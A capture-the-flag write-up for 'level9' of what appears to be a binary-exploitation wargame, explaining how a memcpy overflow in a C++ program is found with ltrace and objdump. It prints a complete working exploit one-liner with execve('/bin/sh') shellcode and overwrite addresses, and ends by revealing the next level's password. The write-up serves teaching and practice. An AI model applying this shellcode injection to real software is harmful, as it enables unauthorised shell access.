# What do we exploit?

Buffer overflow in insecure `memcpy` function.

# How do we exploit it?

The binary is very strange, because, at first glance, it does absolutely nothing. Only trying to pass very long strings in it as argument will give you a thought, that it's actually reads the arguments. Examining it with the `ltrace` also gives food for thought.

    ./level9 $(python -c "print 'A'*109")
    ltrace ./level9 abcdefg

Actually, it's not a C binary, but C++ binary. We can recognize it by running `objdump` with even more flags:

    objdump -d -m i386 -DRCTsx ./level9

In that code we have class N, and we will have two variables with pointers to corresponding objects of N class. And, actually, two extra pointers to those pointers. Everything will become much clearer if you just look at the source code, mate.

Now we should get the address of the destination variable for the `memcpy` function. We can do that by using `ltrace`. The address we've got is `0x0804a00c`. So, because we dereferencing the pointer twice, we need link on link on something (**spoiler:** on our beloved [shellcode](http://shell-storm.org/shellcode/files/shellcode-811.php)). So, we can do it like that:

    ./level9 $(python -c 'print "\x08\x04\xa0\x10"[::-1] + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x08\x04\xa0\x0c"[::-1]')

In case you didn't understand, all that thing is one variable with one address we've got with help of ltrace. It works like that:

1. First part is the address of the second part (address of variable + 4), which is, obviously, shellcode;
2. Second part is just a shellcode, and that's it;
3. Third part is the address of the first part, which is address of the second part, which is, obviously, a shellcode.

Now you've got an idea, I guess. It works just like in levels with `strcpy` vulnerabilities. Same vibe, same approaches.

You can get the password from the next level as usual. Here it is: `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`.